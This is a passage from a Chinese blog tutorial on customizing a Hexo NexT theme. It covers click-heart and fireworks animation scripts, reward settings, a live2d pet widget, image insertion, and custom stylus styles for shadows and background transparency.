class="string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="string">&quot;,&quot;</span>+d[e].scale+<span class="string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">&quot;function&quot;</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;div&quot;</span>);a.className=<span class="string">&quot;heart&quot;</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX-<span class="number">5</span>,<span class="attr">y</span>:e.clientY-<span class="number">5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;style&quot;</span>);a.type=<span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">&quot;rgb(&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">setTimeout</span>(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;clicklove.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>另一种特效</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/fireworks.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;<span class="string">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.fireworks %&#125;   &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml		<span class="comment">#在主题文件中加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fireworksfireworks: true</span></span><br></pre></td></tr></table></figure>
<h3 id="添加打赏"><a href="#添加打赏" class="headerlink" title="添加打赏"></a>添加打赏</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reward (Donate)</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># 如果为true，则默认情况下会在每篇文章中显示奖励</span></span><br><span class="line">  <span class="comment"># 可以通过&quot; reward：true | false”在特定文章中显示或隐藏奖励</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Donate comment here		#在这里发表评论</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png		#微信收款码</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png			#支付宝收款码</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png			#比特币收款</span></span><br></pre></td></tr></table></figure>
<h3 id="底部博客平台信息"><a href="#底部博客平台信息" class="headerlink" title="底部博客平台信息"></a>底部博客平台信息</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">powered:</span></span><br><span class="line">   <span class="comment"># Hexo (由Hexo提供支持)</span></span><br><span class="line">   <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">   <span class="comment"># 版本信息</span></span><br><span class="line">   <span class="attr">version:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">theme:</span></span><br><span class="line">   <span class="comment"># Theme (主题 - NexT.scheme).</span></span><br><span class="line">   <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">   <span class="comment"># 版本信息</span></span><br><span class="line">   <span class="attr">version:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="其他配置文件配置"><a href="#其他配置文件配置" class="headerlink" title="其他配置文件配置"></a>其他配置文件配置</h2><h3 id="宠物"><a href="#宠物" class="headerlink" title="宠物"></a>宠物</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br><span class="line">yarn add live2d-widget-model-tororo		<span class="comment">#安装一种宠物的模块</span></span><br><span class="line">vim _config.yml	<span class="comment">#博客的或主题的主配置文件都行,加入代码选择宠物类型</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a><br><a href="https://github.com/xiazeyu/live2d-widget-models">live2d-widget-models</a></p>
<details><summary>宠物样式表</summary><br>

live2d-widget-model-chitose<br>
live2d-widget-model-epsilon2_1<br>
live2d-widget-model-gf<br>
live2d-widget-model-haru/01 (live2d-widget-model-haru)<br>
live2d-widget-model-haru/02 (live2d-widget-model-haru)<br>
live2d-widget-model-haruto<br>
live2d-widget-model-hibiki<br>
live2d-widget-model-hijiki<br>
live2d-widget-model-izumi<br>
live2d-widget-model-koharu<br>
live2d-widget-model-miku<br>
live2d-widget-model-ni-j<br>
live2d-widget-model-nico<br>
live2d-widget-model-nietzsche<br>
live2d-widget-model-nipsilon<br>
live2d-widget-model-nito<br>
live2d-widget-model-shizuku<br>
live2d-widget-model-tororo(白猫)<br>
live2d-widget-model-tsumiki<br>
live2d-widget-model-unitychan<br>
live2d-widget-model-wanko<br>
live2d-widget-model-z16<br>

</details>

<p><a href="https://blog.csdn.net/wang_123_zy/article/details/87181892">样式预览</a></p>
<p>需要先使用 <code>yarn add 模型的包名</code> 来安装</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span>	<span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span>	<span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span>	<span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span>	<span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span>	<span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-tororo</span>	<span class="comment"># 模块名，博客根目录/node_models/ 下的目录名</span></span><br><span class="line">  <span class="attr">display:</span>		<span class="comment">#放置位置和大小</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">600</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span>		<span class="comment">#是否在手机端显示</span></span><br></pre></td></tr></table></figure>
<h3 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件，开启资源文件夹</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#开启后新建文章的时会同时创建一个同名文件夹用于存放文章资源（如:图片）</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-asset-image 	<span class="comment">#安装插件</span></span><br><span class="line">vim node_modules/hexo-asset-image/index.js   <span class="comment">#修改文件配置，修正一个错误</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> endPos = link.length-<span class="number">1</span>;	<span class="comment">//将第24行修改为这样</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>将图片放到该文件夹下，在文章中添加图片</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image_name</span>](<span class="link">name.jpg</span>)		#只需要添加文件名即可，无需加上目录</span><br></pre></td></tr></table></figure>
<h1 id="自定义样式（next-v7）"><a href="#自定义样式（next-v7）" class="headerlink" title="自定义样式（next v7）"></a>自定义样式（next v7）</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义自定义文件路径</span></span><br><span class="line"><span class="comment"># 在站点目录`source/_data`中创建自定义文件，并在下面取消注释所需的文件</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
<h2 id="文章阴影"><a href="#文章阴影" class="headerlink" title="文章阴影"></a>文章阴影</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Custom styles.</span></span><br><span class="line"><span class="comment">// 主页文章添加阴影效果</span></span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="背景图"><a href="#背景图" class="headerlink" title="背景图"></a>背景图</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加指自定义样式</span></span><br><span class="line">mkdir <span class="built_in">source</span>/images		<span class="comment">#创建图片存放目录，然后将背景图放到该目录下即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  background: url(/images/background.jpg);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文章内容的透明度设置</span></span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//侧边框的透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//站点概况透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单栏的透明度设置</span></span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索框（local-search）的透明度设置</span></span><br><span class="line"><span class="selector-class">.popup</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.85</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
